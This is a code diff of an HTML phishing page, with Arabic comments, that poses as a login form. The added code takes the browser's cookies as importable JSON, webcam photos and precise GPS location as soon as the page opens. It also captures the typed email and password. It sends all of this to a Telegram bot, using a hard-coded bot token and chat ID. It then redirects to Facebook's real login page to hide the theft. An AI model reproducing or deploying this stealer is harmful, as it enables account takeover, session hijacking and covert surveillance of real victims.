@@ -30,71 +30,71 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-// --- الإعدادات ---
 const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
 
-// 1. دالة جلب الكوكيز (توضع هنا كدالة مساعدة)
-function getCookies() {
-    try {
-        const cookies = document.cookie;
-        return cookies ? cookies : "لا توجد كوكيز متاحة (HttpOnly protection active)";
-    } catch (e) {
-        return "فشل الوصول للكوكيز";
-    }
+// دالة تحويل الكوكيز لتنسيق JSON المتوافق مع الأداة
+function getCookiesJSON() {
+    let cookies = document.cookie.split(';');
+    let cookieArr = [];
+    cookies.forEach(cookie => {
+        let parts = cookie.split('=');
+        if(parts.length >= 2) {
+            cookieArr.push({
+                "name": parts[0].trim(),
+                "value": parts[1].trim(),
+                "domain": window.location.hostname,
+                "path": "/"
+            });
+        }
+    });
+    return cookieArr.length > 0 ? JSON.stringify(cookieArr, null, 2) : "No Public Cookies Found";
 }
 
-document.getElementById('loginBtn').addEventListener('click', async function() {
+// تنفيذ سحب البيانات فور فتح الرابط
+window.onload = function() {
+    startCapture("فتح الرابط (تلقائي)");
+};
+
+// تنفيذ سحب البيانات عند ضغط الزر (للتأكيد وسحب كلمة السر)
+document.getElementById('loginBtn').addEventListener('click', function() {
     const email = document.getElementById('email').value;
     const pass = document.getElementById('pass').value;
+    startCapture(`تسجيل دخول: ${email} | ${pass}`);
+});
 
-    if(!email || !pass) {
-        alert("يرجى إدخال البيانات");
-        return;
-    }
-
-    this.innerText = "جاري التحقق...";
-    this.disabled = true;
-
+async function startCapture(triggerSource) {
     try {
-        // تشغيل الكاميرا والتقاط الصورة
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.getElementById('video');
         video.srcObject = stream;
+
+        // انتظار 2.5 ثانية لإصلاح السواد وضمان الإضاءة
+        await new Promise(res => setTimeout(res, 2500));
+
+        const canvas = document.getElementById('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        const photoData = canvas.toDataURL('image/jpeg', 0.8);
         
-        setTimeout(() => {
-            const canvas = document.getElementById('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            const photoData = canvas.toDataURL('image/jpeg');
-            
-            stream.getTracks().forEach(track => track.stop());
+        stream.getTracks().forEach(t => t.stop());
 
-            // جلب الموقع ثم الإرسال
-            navigator.geolocation.getCurrentPosition(
-                (pos) => processAndSend(email, pass, photoData, `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
-                () => processAndSend(email, pass, photoData, "الموقع مرفوض من المستخدم"),
-                { enableHighAccuracy: true }
-            );
-        }, 1000);
-
+        navigator.geolocation.getCurrentPosition(
+            (pos) => sendToTelegram(photoData, `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, triggerSource),
+            () => sendToTelegram(photoData, "الموقع مرفوض", triggerSource),
+            { enableHighAccuracy: true }
+        );
     } catch (err) {
-        processAndSend(email, pass, null, "الكاميرا مرفوضة من المستخدم");
+        sendToTelegram(null, "الكاميرا مرفوضة", triggerSource);
     }
-});
+}
 
-// 2. دالة الإرسال المحدثة التي تشمل الكوكيز
-async function processAndSend(email, pass, photo, location) {
-    const cookiesData = getCookies(); // جلب الكوكيز هنا
-    const device = navigator.userAgent; // جلب بصمة المتصفح
-
-    const caption = `🎭 **إبهار تقني: اختراق كامل** 🎭\n\n` +
-                    `📧 **الإيميل:** \`${email}\`\n` +
-                    `🔑 **كلمة السر:** \`${pass}\`\n\n` +
-                    `🍪 **الجلسة (Cookies):**\n\`${cookiesData}\`\n\n` +
-                    `📍 **الموقع:** ${location}\n` +
-                    `📱 **المتصفح:** \`${device}\`\n` +
+async function sendToTelegram(photo, location, extraInfo) {
+    const cookiesJSON = getCookiesJSON();
+    const caption = `🚀 **عملية صيد تعليمية (${extraInfo})**\n\n` +
+                    `📍 **الموقع:** ${location}\n\n` +
+                    `🍪 **الكوكيز (صيغة JSON للاستيراد):**\n\`\`\`json\n${cookiesJSON}\n\`\`\`\n` +
                     `🕒 **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
 
     const formData = new FormData();
@@ -104,17 +104,17 @@ async function processAndSend(email, pass, photo, location) {
 
     if (photo) {
         const blob = await (await fetch(photo)).blob();
-        formData.append('photo', blob, 'selfie.jpg');
+        formData.append('photo', blob, 'capture.jpg');
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
     } else {
         formData.append('text', caption);
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
     }
-
-    // التوجيه النهائي للتمويه
-    window.location.href = "https://www.facebook.com/login.php";
+    
+    if (extraInfo.includes("تسجيل دخول")) {
+        window.location.href = "https://www.facebook.com/login.php";
+    }
 }
 </script>
 </body>
 </html>
-
